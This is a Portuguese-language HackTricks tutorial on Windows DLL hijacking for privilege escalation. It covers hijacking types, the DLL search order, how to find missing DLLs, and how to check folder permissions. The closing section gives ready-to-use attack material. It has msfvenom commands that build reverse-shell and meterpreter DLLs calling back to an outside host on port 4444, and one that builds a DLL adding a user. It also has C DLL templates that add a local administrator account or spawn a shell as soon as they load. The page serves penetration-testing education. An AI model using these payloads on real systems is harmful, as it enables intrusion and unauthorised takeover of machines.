# Dll Hijacking

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se você está interessado em **carreira de hacking** e hackear o inquebrável - **estamos contratando!** (_polonês fluente escrito e falado é necessário_).

{% embed url="https://www.stmcyber.com/careers" %}

## Definição

Primeiramente, vamos esclarecer a definição. Dll hijacking é, no sentido mais amplo, **enganar uma aplicação legítima/confiável para carregar uma DLL arbitrária**. Termos como _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ e _DLL Side-Loading_ são frequentemente -erroneamente- usados para dizer o mesmo.

Dll hijacking pode ser usado para **executar** código, obter **persistência** e **escalar privilégios**. Destes 3, o **menos provável** de encontrar é **escalação de privilégios**. No entanto, como isso faz parte da seção de escalação de privilégios, vou focar nesta opção. Além disso, note que independentemente do objetivo, um dll hijacking é realizado da mesma maneira.

### Tipos

Há uma **variedade de abordagens** para escolher, com sucesso dependendo de como a aplicação está configurada para carregar suas DLLs necessárias. As abordagens possíveis incluem:

1. **Substituição de DLL**: substituir uma DLL legítima por uma DLL maliciosa. Isso pode ser combinado com _DLL Proxying_, que garante que toda a funcionalidade da DLL original permaneça intacta.
2. **Hijacking da ordem de busca de DLL**: DLLs especificadas por uma aplicação sem um caminho são procuradas em locais fixos em uma ordem específica. O hijacking da ordem de busca ocorre colocando a DLL maliciosa em um local que é pesquisado antes da DLL real. Isso às vezes inclui o diretório de trabalho da aplicação alvo.
3. **Phantom DLL hijacking**: colocar uma DLL maliciosa no lugar de uma DLL ausente/não existente que uma aplicação legítima tenta carregar.
4. **Redirecionamento de DLL**: alterar o local onde a DLL é procurada, por exemplo, editando a variável de ambiente `%PATH%`, ou arquivos `.exe.manifest` / `.exe.local` para incluir a pasta contendo a DLL maliciosa.
5. **Substituição de DLL no WinSxS**: substituir a DLL legítima pela DLL maliciosa na pasta WinSxS relevante da DLL alvo. Frequentemente referido como DLL side-loading.
6. **Hijacking de DLL de caminho relativo**: copiar (e opcionalmente renomear) a aplicação legítima para uma pasta editável pelo usuário, junto com a DLL maliciosa. Na maneira como isso é usado, tem semelhanças com (Signed) Binary Proxy Execution. Uma variação disso é (de forma um tanto paradoxal) chamada de ‘_bring your own LOLbin_’ na qual a aplicação legítima é trazida com a DLL maliciosa (em vez de copiada do local legítimo na máquina da vítima).

## Encontrando Dlls ausentes

A maneira mais comum de encontrar Dlls ausentes dentro de um sistema é executar [procmon] da sysinternals, **configurando** os **seguintes 2 filtros**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

e apenas mostrar a **Atividade do Sistema de Arquivos**:

![](<../../.gitbook/assets/image (314).png>)

Se você está procurando por **dlls ausentes em geral**, você **deixa** isso rodando por alguns **segundos**.\
Se você está procurando por uma **dll ausente dentro de um executável específico**, você deve configurar **outro filtro como "Nome do Processo" "contém" "\<nome do exec>", executá-lo e parar de capturar eventos**.

## Explorando Dlls Ausentes

Para escalar privilégios, a melhor chance que temos é ser capazes de **escrever uma dll que um processo privilegiado tentará carregar** em algum **lugar onde ela será procurada**. Portanto, seremos capazes de **escrever** uma dll em uma **pasta** onde a **dll é procurada antes** da pasta onde a **dll original** está (caso estranho), ou seremos capazes de **escrever em alguma pasta onde a dll será procurada** e a dll original **não existe** em nenhuma pasta.

### Ordem de Busca de Dll

**Dentro da** [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **você pode encontrar como as Dlls são carregadas especificamente.**

Em geral, uma **aplicação Windows** usará **caminhos de busca pré-definidos para encontrar DLLs** e verificará esses caminhos em uma ordem específica. O hijacking de DLL geralmente acontece colocando uma DLL maliciosa em uma dessas pastas, garantindo que a DLL seja encontrada antes da legítima. Esse problema pode ser mitigado fazendo com que a aplicação especifique caminhos absolutos para as DLLs de que precisa.

Você pode ver a **ordem de busca de DLL em sistemas de 32 bits** abaixo:

1. O diretório do qual a aplicação foi carregada.
2. O diretório do sistema. Use a função [**GetSystemDirectory**] para obter o caminho deste diretório. (_C:\Windows\System32_)
3. O diretório do sistema de 16 bits. Não há função que obtenha o caminho deste diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**] para obter o caminho deste diretório.
1. (_C:\Windows_)
5. O diretório atual.
6. Os diretórios listados na variável de ambiente PATH. Note que isso não inclui o caminho por aplicação especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de busca da DLL.

Essa é a **ordem de busca padrão com SafeDllSearchMode ativado**. Quando está desativado, o diretório atual sobe para o segundo lugar. Para desativar esse recurso, crie o valor de registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (padrão é ativado).

Se a função [**LoadLibraryEx**] for chamada com **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, a busca começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Finalmente, note que **uma dll pode ser carregada indicando o caminho absoluto em vez de apenas o nome**. Nesse caso, essa dll é **apenas procurada nesse caminho** (se a dll tiver dependências, elas serão procuradas como se fossem carregadas apenas pelo nome).

Há outras maneiras de alterar a ordem de busca, mas não vou explicá-las aqui.

#### Exceções na ordem de busca de dll da documentação do Windows

* Se uma **DLL com o mesmo nome do módulo já estiver carregada na memória**, o sistema verifica apenas por redirecionamento e um manifesto antes de resolver para a DLL carregada, não importa em qual diretório ela esteja. **O sistema não procura pela DLL**.
* Se a DLL estiver na lista de **DLLs conhecidas** para a versão do Windows em que a aplicação está rodando, o **sistema usa sua cópia da DLL conhecida** (e as DLLs dependentes da DLL conhecida, se houver) **em vez de procurar** pela DLL. Para uma lista de DLLs conhecidas no sistema atual, veja a seguinte chave de registro: **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
* Se uma **DLL tiver dependências**, o sistema **procura** pelas DLLs dependentes como se elas fossem carregadas apenas com seus **nomes de módulos**. Isso é verdade **mesmo se a primeira DLL foi carregada especificando um caminho completo**.

### Escalando Privilégios

**Requisitos**:

* **Encontrar um processo** que executa/será executado com **outros privilégios** (movimento horizontal/lateral) que está **faltando uma dll**.
* Ter **permissão de escrita** em qualquer **pasta** onde a **dll** será **procurada** (provavelmente o diretório executável ou alguma pasta dentro do caminho do sistema).

Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado faltando uma dll** e é ainda **mais estranho ter permissões de escrita em uma pasta do caminho do sistema** (você não pode por padrão). Mas, em ambientes mal configurados isso é possível.\
No caso de você ter sorte e encontrar-se atendendo aos requisitos, você poderia verificar o projeto [UACME]. Mesmo que o **objetivo principal do projeto seja burlar o UAC**, você pode encontrar lá um **PoC** de um hijacking de DLL para a versão do Windows que você pode usar (provavelmente apenas mudando o caminho da pasta onde você tem permissões de escrita).

Note que você pode **verificar suas permissões em uma pasta** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro do PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executável e os exports de uma dll com:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar do Dll Hijacking para escalar privilégios** com permissões para escrever em uma pasta do **Caminho do Sistema**, confira:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Ferramentas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará se você tem permissões de escrita em alguma pasta dentro do PATH do sistema.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **funções do PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar uma dll que exporte pelo menos todas as funções que o executável importará dela**. No entanto, observe que o Dll Hijacking é útil para [escalar do nível de Integridade Média para Alto **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou de [**Alto Integridade para SYSTEM**](./#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma dll válida** dentro deste estudo de hijacking de dll focado em hijacking de dll para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção** você pode encontrar alguns **códigos básicos de dll** que podem ser úteis como **modelos** ou para criar uma **dll com funções não requeridas exportadas**.

## **Criando e compilando Dlls**

### **Dll Proxifying**

Basicamente, um **Dll proxy** é uma Dll capaz de **executar seu código malicioso quando carregada**, mas também de **expor** e **funcionar** conforme **esperado** ao **encaminhar todas as chamadas para a biblioteca real**.

Com a ferramenta \*\*\*\* [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) \*\*\*\* ou \*\*\*\* [**Spartacus**](https://github.com/Accenture/Spartacus) \*\*\*\*, você pode realmente **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar uma dll proxificada** ou **indicar a Dll** e **gerar uma dll proxificada**.

### **Meterpreter**

**Obter rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86 Não vi uma versão x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Note que, em vários casos, a Dll que você compilar deve **exportar várias funções** que serão carregadas pelo processo vítima. Se essas funções não existirem, o **binário não conseguirá carregá-las** e o **exploit falhará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se você está interessado em **carreira de hacking** e hackear o inquebrável - **estamos contratando!** (_é necessário polonês fluente escrito e falado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
